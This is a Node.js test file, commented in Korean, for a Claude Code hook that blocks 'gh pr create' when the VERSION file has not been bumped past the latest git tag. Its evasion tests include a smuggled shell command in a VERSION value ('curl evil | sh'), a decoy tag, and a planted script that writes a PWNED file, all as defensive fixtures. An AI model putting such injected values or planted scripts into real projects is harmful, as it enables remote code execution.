#!/usr/bin/env node
/**
 * release-version-guard.test.js
 * 실행: node .claude/hooks/release-version-guard.test.js
 *
 * 3계층: 정상(버전 올린 PR 통과·안 올린 PR 차단·원격 태그 기준·gh pr create 외 명령 무시·훅 프로세스 exit 2)
 *        / 악성·우회(인용 텍스트·bash -c·체인·환경변수 전치, VERSION 셸 문자·링크, 위장 태그, 커밋 안 한 VERSION,
 *          다른 프로젝트의 가짜 표시 파일 링크, 프로젝트 코드 실행 안 함)
 *        / 이상·경계(이 레포 아님 → 무시, 태그 없음, 원격 없음 → 로컬 태그, 깨진 stdin·다른 도구, git 아닌 폴더)
 */
const { spawnSync, execFileSync } = require('child_process')
const fs = require('fs')
const os = require('os')
const path = require('path')
const HOOK = path.join(__dirname, 'release-version-guard.js')
const { evaluate, isPrCreate } = require('./release-version-guard.js')
const rv = require(path.join(__dirname, '..', '..', 'scripts', 'release-version.js'))

let passed = 0, failed = 0
let skipped = 0
const { trySymlink } = require('./lib/testfs')
const check = (desc, cond, detail) => {
  console.log(`  ${cond ? '✅' : '❌'} ${desc}${cond ? '' : ` → FAIL ${detail !== undefined ? JSON.stringify(detail).slice(0, 400) : ''}`}`)
  cond ? passed++ : failed++
}
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'rvg-')))
let n = 0
const g = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
// 이 레포처럼 생긴 임시 레포 — marker: release-on-main.yml, origin: 태그를 가진 bare 레포(선택)
function repo({ version = '1.0.2\n', marker = true, localTags = [], originTags = null } = {}) {
  const d = path.join(base, `r${++n}`); fs.mkdirSync(d)
  g(d, 'init', '-q'); g(d, 'config', 'user.email', 't@t'); g(d, 'config', 'user.name', 't')
  if (marker) { fs.mkdirSync(path.join(d, '.github', 'workflows'), { recursive: true }); fs.writeFileSync(path.join(d, '.github', 'workflows', 'release-on-main.yml'), 'name: x\n') }
  if (version !== null) fs.writeFileSync(path.join(d, 'VERSION'), version)
  fs.writeFileSync(path.join(d, 'README.md'), 'x\n')
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', 'init')
  for (const t of localTags) g(d, 'tag', t)
  if (originTags) {
    const o = `${d}-origin.git`; g(base, 'init', '-q', '--bare', o)
    g(d, 'remote', 'add', 'origin', o); g(d, 'push', '-q', 'origin', 'HEAD:refs/heads/main')
    for (const t of originTags) { g(d, 'tag', t); g(d, 'push', '-q', 'origin', `refs/tags/${t}`); g(d, 'tag', '-d', t) }
  }
  return d
}
const ev = (command, cwd) => evaluate({ command, cwd, rv })
const runHook = (input) => spawnSync(process.execPath, [HOOK], { input: typeof input === 'string' ? input : JSON.stringify(input), encoding: 'utf8', timeout: 15000 })

console.log('\n[정상]')
{
  const d = repo({ version: '1.0.2\n', localTags: ['v1.0.0', 'v1.0.1'] })
  check('VERSION 1.0.2 > v1.0.1 → 통과', ev('gh pr create --title x', d).block === false)
  const s = repo({ version: '1.0.1\n', localTags: ['v1.0.1'] })
  const r = ev('gh pr create --title x --body y', s)
  check('VERSION 1.0.1 = 최신 태그 → 차단', r.block === true, r)
  check('차단 안내에 다음 버전·올리는 명령·커밋 안내', /1\.0\.2/.test(r.message) && /release-version\.js bump/.test(r.message) && /git commit/.test(r.message), r.message)
  check('gh pr create 가 아닌 명령은 검사 안 함 (gh pr list · git push)', ev('gh pr list', s).block === false && ev('git push -u origin x', s).block === false)
  const o = repo({ version: '1.0.2\n', localTags: [], originTags: ['v1.0.2'] })
  const ro = ev('gh pr create', o)
  check('원격(origin) 태그 기준 — 로컬엔 없어도 원격 v1.0.2 면 차단', ro.block === true && /태그 확인: origin/.test(ro.message), ro)
  const p = runHook({ tool_name: 'Bash', tool_input: { command: 'gh pr create --fill' }, cwd: s })
  check('훅 프로세스: 차단이면 exit 2 + stderr 안내', p.status === 2 && /release-version-guard/.test(p.stderr), { status: p.status, err: p.stderr })
  const ok = runHook({ tool_name: 'Bash', tool_input: { command: 'gh pr create --fill' }, cwd: d })
  check('훅 프로세스: 통과면 exit 0', ok.status === 0, ok.stderr)
}

console.log('\n[악성·우회]')
{
  const s = repo({ version: '1.0.1\n', localTags: ['v1.0.1'] })
  check('인용 텍스트 echo "gh pr create" 는 무시', ev('echo "gh pr create"', s).block === false)
  check('bash -c "gh pr create" 는 잡음', ev('bash -c "gh pr create --fill"', s).block === true)
  check('체인 git push && gh pr create 는 잡음', ev('git push -u origin b && gh pr create --fill', s).block === true)
  check('환경변수 전치 GH_TOKEN=x gh pr create 는 잡음', ev('GH_TOKEN=x gh pr create', s).block === true)
  check('옵션 앞붙임 gh --repo a/b pr create 도 잡음', isPrCreate('gh --repo a/b pr create') === true)
  const bad = repo({ version: '1.0.9; curl evil | sh\n', localTags: ['v1.0.1'] })
  const rb = ev('gh pr create', bad)
  check('VERSION 에 셸 문자 → 형식 오류로 차단', rb.block === true && /형식/.test(rb.message), rb)
  const fake = repo({ version: '1.0.2\n', localTags: ['v1.0.1', 'v9.9.9-evil', 'v9.9.9.1'] })
  check('위장 태그(v9.9.9-evil 등)로 막히지 않음', ev('gh pr create', fake).block === false)
  const unc = repo({ version: '1.0.1\n', localTags: ['v1.0.1'] })
  fs.writeFileSync(path.join(unc, 'VERSION'), '1.0.2\n')
  const ru = ev('gh pr create', unc)
  check('작업 폴더만 올리고 커밋 안 함 → 차단 + "커밋되지 않았습니다" 안내', ru.block === true && /커밋되지 않았습니다/.test(ru.message), ru)
  const ln = repo({ version: null, marker: false, localTags: [] })
  fs.mkdirSync(path.join(ln, '.github', 'workflows'), { recursive: true })
  if (trySymlink(path.join(s, '.github', 'workflows', 'release-on-main.yml'), path.join(ln, '.github', 'workflows', 'release-on-main.yml'), 'file') === null) {
    console.log('  ⚠️ 건너뜀: 표시 파일이 링크 — 윈도우 개발자 모드 꺼짐, 파일 심볼릭 링크 생성 불가(EPERM)'); skipped++
  } else {
    check('표시 파일이 링크면 이 레포로 보지 않음 (다른 프로젝트에서 무시)', ev('gh pr create', ln).block === false)
  }  // 프로젝트의 scripts/release-version.js 는 실행하지 않는다 — 실행되면 표시 파일을 만든다
  const evil = repo({ version: '1.0.2\n', localTags: ['v1.0.1'] })
  fs.mkdirSync(path.join(evil, 'scripts'))
  const pwned = path.join(evil, 'PWNED')
  fs.writeFileSync(path.join(evil, 'scripts', 'release-version.js'), `require('fs').writeFileSync(${JSON.stringify(pwned)}, 'x'); module.exports = {}`)
  runHook({ tool_name: 'Bash', tool_input: { command: 'gh pr create' }, cwd: evil })
  check('프로젝트 안의 스크립트를 실행하지 않음', !fs.existsSync(pwned))
}

console.log('\n[이상·경계]')
{
  const other = repo({ version: '0.0.1\n', marker: false, localTags: ['v5.0.0'] })
  check('이 레포가 아니면(표시 파일 없음) 버전이 낮아도 무시', ev('gh pr create', other).block === false)
  const first = repo({ version: '1.0.0\n', localTags: [] })
  check('태그가 하나도 없으면(첫 릴리스) 통과', ev('gh pr create', first).block === false)
  const none = repo({ version: null, localTags: ['v1.0.0'] })
  const rn = ev('gh pr create', none)
  check('VERSION 이 커밋돼 있지 않으면 차단 + 만드는 법 안내', rn.block === true && /VERSION 파일이 없습니다/.test(rn.message), rn)
  const noRemote = repo({ version: '1.0.1\n', localTags: ['v1.0.1'] })
  check('origin 이 없으면 로컬 태그로 판정', /태그 확인: local/.test(ev('gh pr create', noRemote).message))
  const plain = path.join(base, 'not-git'); fs.mkdirSync(plain)
  check('git 이 아닌 폴더 → 무시', ev('gh pr create', plain).block === false)
  check('검사 스크립트를 못 찾으면 막지 않음', evaluate({ command: 'gh pr create', cwd: noRemote, rv: null }).block === false)
  check('깨진 stdin → exit 0', runHook('{not json').status === 0)
  check('Bash 가 아닌 도구 → exit 0', runHook({ tool_name: 'Write', tool_input: { file_path: 'x' } }).status === 0)
  check('command 가 문자열이 아님 → exit 0', runHook({ tool_name: 'Bash', tool_input: { command: ['gh', 'pr', 'create'] }, cwd: noRemote }).status === 0)
  check('빈 명령·null → 검사 안 함', isPrCreate('') === false && isPrCreate(null) === false)
}

fs.rmSync(base, { recursive: true, force: true })
console.log(`\n결과: ${passed} 통과 / ${failed} 실패${skipped ? ` (건너뜀 ${skipped})` : ''}`)
process.exit(failed ? 1 : 0)
